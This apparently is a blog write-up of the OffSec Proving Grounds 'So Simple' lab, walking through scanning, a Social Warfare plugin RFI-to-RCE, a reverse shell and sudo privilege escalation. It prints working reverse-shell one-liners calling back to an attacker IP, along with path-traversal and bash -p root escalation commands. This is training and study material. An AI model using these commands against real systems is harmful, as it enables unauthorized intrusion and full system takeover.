---
title: OffSec PG - So Simple
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.244.78`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.78`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

### Table

| **Port** | **Service** | **Other details (if any)**                                   |
| -------- | ----------- | ------------------------------------------------------------ |
| 22       | SSH         | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.41 ((Ubuntu))                               |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.244.78 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- index.html
- icons/ (403)
- wordpress/
- server-status/ (403)

Repeating a scan for the `/wordpress/` subdirectory, the following were listed &rarr;

- index.php (301)
- wp-content/
- wp-login.php
- license.txt
- wp-includes/
- readme.html
- wp-trackback.php
- wp-admin (302, to wp-login.php)

WPScan was also run given the presence of the wordpress site. This revealed the following findings &rarr;

- Plugin Social Warfare 3.5.0 (out of date)
- Plugin Simple Cart Solution 0.2.0 (out of date)
- Theme twentynineteen 1.6 (out of date)
- Wordpress version 5.4.2
- Enabled WP-Cron at /wordpress/wp-cron.php
- Directory listing at /wordpress/wp-content/uploads/
- XMLRPC enabled at /xmlrpc.php

---

## Exploitation

### RFI and RCE

With all the information above, the first searchsploit result is that of an RCE in Social Warfare versions < 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in `/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=<RFI_URL>`.

### Reverse Shell

Visiting this page would give the result of the command in the payload url. The payload must be of the form &rarr; `<pre>system('whoami')</pre>`. Checking the existence of netcat and bash, a new payload can be used for a reverse shell &rarr; `nc -e /bin/bash 192.168.49.244 3002`. This didn't work, therefore, used the usual bash payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.244 3002 >/tmp/f`. This grants the shell as `www-data` user.

---

## Privilege Escalation

### User 1

Looking at `/etc/passwd`, the users of interest are `root`, `max` and `steven`. The home directory of both `max` and `steven` are readable by `www-data`. The user flag is in `max`'s home directory. The webroot also contains a base32 encoded string in a file `mybackup.txt` &rarr; `JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF`.

This decodes to `I have to keep this password somewhere safely because I can't remember it: opensesame`. Therefore, this password is attempted on ssh for `max` and `steven`. However, this did not work.

The home directory of `max` also has a `.ssh` directory, which contains the private key of `max`. This is readable by `www-data` and is thus used to ssh into the server as `max`, which grants the shell and thus the user flag as well.

### User 2

Checked the ability of `max` to run `sudo` using `sudo -l`. This allowed running `/usr/sbin/service` as `steven` without a password. The `service` command looks for services in a specific directory and launches them. It can therefore be tricked by prepending `../../../../` to whichever command needs to be executed. Therefore running &rarr;

```
sudo -u steven /usr/sbin/service ../../../../bin/bash
```

grants the shell as `steven`.

### Root

Looked at the ability of `steven` to run `sudo`. This revealed that `steven` is allowed to run `/opt/tools/server-health.sh` as `root` without a password. The path does not exist, therefore, a new executable is created with the same name and the following content &rarr;

```
#!/bin/bash
bash -p
```

Then command `sudo /opt/tools/server-health.sh` is executed, which grants the shell as root and also the root flag.

---
